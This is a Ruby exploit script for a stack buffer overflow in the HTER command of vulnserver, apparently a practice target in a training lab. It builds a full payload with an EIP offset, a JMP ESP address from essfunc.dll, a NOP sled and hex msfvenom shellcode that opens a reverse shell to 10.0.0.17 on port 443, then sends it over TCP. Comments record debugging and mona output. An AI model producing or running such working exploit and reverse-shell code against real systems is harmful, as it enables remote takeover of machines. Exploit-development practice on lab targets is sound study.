#!/usr/bin/ruby
#encoding: ascii

require"socket"
ip = "10.0.0.9"
port = 9999
payload = ""
payload << "T"			#padding to aligh stack 4 bytes
#payload << "efbeadde" * 2050	#seems app copy all text, into memory, 	
				#then treat them like hex little endian, 
				#and copy to another buffer that cause BOF
payload << "A"*2040		#offset to EIP
#payload << "Z"*2040		#lol, not work :P
#payload << "efbeadde"		#got EIP, text is treated as hex in little endian 	
				#so eip now has deadbeef
payload << "AF115062"		#jmp esp in essfunc.dll, thank you :)
#payload << "cccccccc"		#software breakpoint for debugging
payload << "90"*16		#needed NOPS b/c encode bad char
payload << "dbdabdb12f134ad97424f4582bc9b1523168170368178359d3f1bf65c4743f951519c9702419adf117a9a5579442eb432f262464988d124b19bd67ca99bcbb2ca30ece2de473237fbdf8966fcab52a0480582bf9515a1aacea05bc4f3e3ef557237b4fec97f74e24e6f8fd09c60aff4ee1f48aa611888c7d6b561865cb1dba41edf25d02e1bf2a4ce63efee712ca0127938825e3ff4b47b2a53a78a405e2dcafa8f76cf2a4345d0c3553d67f07fc4c172b754be04cac2b7eb34f4c57701b1ccf5124f70f5df1585ff1aa180fb11af1453e44e16694ed889d7f184d9d6e744f9d913fc67bfb2f8fd494d68aae051601cb069ca62cc855c23ebd95991c68a93708f638dcc871214b9fd6978275cb8e3c6b1656062fcdab89ae8090ada05c18ea94304fa442f739063ca196c0a834d5d2ae3830a54e88edf071257af50a5b1afac1df3a19c315d3848697be367ddbc6b477a43ca4f2a17962efdb12070f4f1202"
#payload << "0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff"
#bad 00				#so vulnserver dont like to work with _00_
TCPSocket.open(ip, port) do |s|
  puts s.gets
  s.print "HTER #{payload}"
end

#initial beffer b/4 process is at
#0179FF78   005B35B8  ASCII "HTER TAAAAAAAA....
#EAX points to 0179F5E0 which is the begining of the processed buffer

#!mona modules says vulnserver.exe and essfunc.dll has no rebase, aslr, or NX so good to go :)
#essefunc.dll
#625011AF   FFE4             JMP ESP
#625011B1   FFE0             JMP EAX

#root@kali:~/Desktop# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.0.0.17 EXITFUNC=thread -b "\x00" -f hex
#Payload size: 351 bytes
#Final size of hex file: 702 bytes
#dbdabdb12f134ad97424f4582bc9b1523168170368178359d3f1bf65c4743f951519c9702419adf117a9a5579442eb432f262464988d124b19bd67ca99bcbb2ca30ece2de473237fbdf8966fcab52a0480582bf9515a1aacea05bc4f3e3ef557237b4fec97f74e24e6f8fd09c60aff4ee1f48aa611888c7d6b561865cb1dba41edf25d02e1bf2a4ce63efee712ca0127938825e3ff4b47b2a53a78a405e2dcafa8f76cf2a4345d0c3553d67f07fc4c172b754be04cac2b7eb34f4c57701b1ccf5124f70f5df1585ff1aa180fb11af1453e44e16694ed889d7f184d9d6e744f9d913fc67bfb2f8fd494d68aae051601cb069ca62cc855c23ebd95991c68a93708f638dcc871214b9fd6978275cb8e3c6b1656062fcdab89ae8090ada05c18ea94304fa442f739063ca196c0a834d5d2ae3830a54e88edf071257af50a5b1afac1df3a19c315d3848697be367ddbc6b477a43ca4f2a17962efdb12070f4f1202